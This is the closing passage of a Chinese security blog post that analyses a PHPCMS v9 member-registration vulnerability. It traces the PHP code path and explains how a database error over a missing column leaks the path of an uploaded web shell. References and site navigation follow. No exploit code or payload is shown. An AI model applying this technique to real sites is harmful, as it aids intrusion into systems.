+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$status = <span class="keyword">$this</span>-&gt;client-&gt;ps_member_register($userinfo[<span class="string">'username'</span>], $userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'email'</span>], $userinfo[<span class="string">'regip'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line"><span class="keyword">if</span>($status &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   $userinfo[<span class="string">'phpssouid'</span>] = $status;</span><br><span class="line">   <span class="comment">//传入phpsso为明文密码，加密后存入phpcms_v9</span></span><br><span class="line">   $password = $userinfo[<span class="string">'password'</span>];		<span class="comment">//获取密码字段</span></span><br><span class="line">   $userinfo[<span class="string">'password'</span>] = password($userinfo[<span class="string">'password'</span>], $userinfo[<span class="string">'encrypt'</span>]);</span><br><span class="line">   $userid = <span class="keyword">$this</span>-&gt;db-&gt;insert($userinfo, <span class="number">1</span>);</span><br><span class="line">   <span class="keyword">if</span>($member_setting[<span class="string">'choosemodel'</span>]) &#123;   <span class="comment">//如果开启选择模型</span></span><br><span class="line">      $user_model_info[<span class="string">'userid'</span>] = $userid;</span><br><span class="line">      <span class="comment">//插入会员模型数据</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;db-&gt;set_model($userinfo[<span class="string">'modelid'</span>]);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;db-&gt;insert($user_model_info);		<span class="comment">//进入insert函数插入数据；</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>只有在其大于0时才会又插入数据库的操作，否则就会操作失败；</p>
+<p>showmessage(L(‘operation_failure’), HTTP_REFERER);</p>
+<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/36468653.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/36468653.jpg" alt="img"></a></p>
+<p>进入ps_member_register函数看一下影响status值得因素；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ps_member_register</span><span class="params">($username, $password, $email, $regip=<span class="string">''</span>, $random=<span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;_is_email($email)) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_ps_send(<span class="string">'register'</span>, <span class="keyword">array</span>(<span class="string">'username'</span>=&gt;$username, <span class="string">'password'</span>=&gt;$password, <span class="string">'email'</span>=&gt;$email, <span class="string">'regip'</span>=&gt;$regip, <span class="string">'random'</span>=&gt;$random));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>邮箱已存在时会返回-3，也就是说邮箱不能与已存在的重复，这也是前面复现，多次测试时，要随机生成的缘故；</p>
+<p>其他情况又会进入_ps_send函数，然后又进入ps_post函数，没有继续深入，猜测是与用户名及邮箱的限制，测试的时候尽量保持相关信息的不重复即可；</p>
+<p>继续看insert操作，最终会进入insert函数进行数据插入；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($data, $return_insert_id = false, $replace = false)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;insert($data, <span class="keyword">$this</span>-&gt;table_name, $return_insert_id, $replace);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在model.class.php中得到当前数据库为v9_member_detail，<a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/73395338.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/73395338.jpg" alt="img"></a></p>
+<p>insert函数中得到其插入字段；</p>
+<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/31830217.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/31830217.jpg" alt="img"></a></p>
+<p>也就是说，向<code>v9_member_detail</code>的<code>content</code>和<code>userid</code>两列插入数据；</p>
+<p>再来看一下此数据表的结构：</p>
+<p><a href="http://ou8vctgrk.bkt.clouddn.com/17-8-10/64317462.jpg" target="_blank" rel="noopener"><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-10/64317462.jpg" alt="img"></a></p>
+<p>并没有content字段，也就造成了数据库报错，得到shell地址；</p>
+<p>如此，就不用爆破了，太野蛮。</p>
+<h1 id="0x03-后记"><a href="#0x03-后记" class="headerlink" title="0x03 后记"></a>0x03 后记</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1，<a href="http://paper.seebug.org/273/" target="_blank" rel="noopener">http://paper.seebug.org/273/</a></p>
+<p>2，<a href="http://www.hackersb.cn/hacker/219.html" target="_blank" rel="noopener">http://www.hackersb.cn/hacker/219.html</a></p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>1，phpstorm+xdebug，可下断点，可开启监听，观察php执行结果，</p>
+<p><a href="https://segmentfault.com/a/1190000004339411" target="_blank" rel="noopener">https://segmentfault.com/a/1190000004339411</a>（如何配置？）</p>
+<p>2，代码读起来还是很吃力，只搞懂了大体思路流程，其总体运行细节日后仍需学习，</p>
+<p><a href="http://v9.help.phpcms.cn" target="_blank" rel="noopener">http://v9.help.phpcms.cn</a>（phpcms v9开发文档）</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/18/服务器相关安全设置/" rel="next" title="服务器相关安全设置">
+                <i class="fa fa-chevron-left"></i> 服务器相关安全设置
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/12/scrapy框架之tutorial示例/" rel="prev" title="scrapy框架之tutorial示例">
+                scrapy框架之tutorial示例 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ry1ynn">
+            
+              <p class="site-author-name" itemprop="name">Ry1ynn</p>
+              <p class="site-description motion-element" itemprop="description">我们的征途是星辰大海</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">126</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">56</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Ry1ynn" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:ry1ynn_pri@163.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://weibo.com/u/5794121667" target="_blank" title="Weibo">
+                      
+                        <i class="fa fa-fw fa-weibo"></i>Weibo</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="/images/weixin.JPG" target="_blank" title="Wechat">
+                      
+                        <i class="fa fa-fw fa-weixin"></i>Wechat</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.t00ls.net/" title="T00ls" target="_blank">T00ls</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.freebuf.com/" title="FreeBuf" target="_blank">FreeBuf</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.sec-wiki.com/" title="SecWiki" target="_blank">SecWiki</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.seebug.org/" title="Seebug" target="_blank">Seebug</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.91ri.org/" title="91Ri" target="_blank">91Ri</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.pediy.com/" title="看雪" target="_blank">看雪</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.52pojie.cn/" title="吾爱破解" target="_blank">吾爱破解</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.anquanke.com/" title="安全客" target="_blank">安全客</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.ichunqiu.com/" title="i春秋" target="_blank">i春秋</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞复现"><span class="nav-text">0x01 漏洞复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞分析"><span class="nav-text">0x02 漏洞分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-后记"><span class="nav-text">0x03 后记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他"><span class="nav-text">其他</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ry1ynn</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script id="ribbon" type="text/javascript" size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
